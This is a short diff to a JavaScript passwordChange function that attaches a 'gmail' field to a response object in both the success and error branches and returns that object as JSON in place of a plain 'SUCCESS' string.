@@ -555,22 +555,18 @@ function passwordChange(connection, mData) {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 }
             }).then(res => {
-                console.log(mData[8], send)
-
+                send['gmail'] = mData[8]
+                console.log(send)
                 if (connection) {
-                    connection.end('SUCCESS')
+                    connection.end(JSON.stringify(send))
                 }
             }).catch(err => {
+                send['gmail'] = mData[8]
+                console.log(send)
                 if (connection) {
-                    send['gmail'] = mData[8]
-                    console.log(send)
                     connection.end(JSON.stringify(send))
                 }
             })
-
-            if (connection) {
-                connection.end('SUCCESS')
-            }
         } catch (e) {}
         
     }).catch(err => {
@@ -584,15 +580,15 @@ function passwordChange(connection, mData) {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 }
             }).then(res => {
-                console.log(mData[8], send)
-
+                send['gmail'] = mData[8]
+                console.log(send)
                 if (connection) {
-                    connection.end('SUCCESS')
+                    connection.end(JSON.stringify(send))
                 }
             }).catch(err => {
+                send['gmail'] = mData[8]
+                console.log(send)
                 if (connection) {
-                    send['gmail'] = mData[8]
-                    console.log(send)
                     connection.end(JSON.stringify(send))
                 }
             })
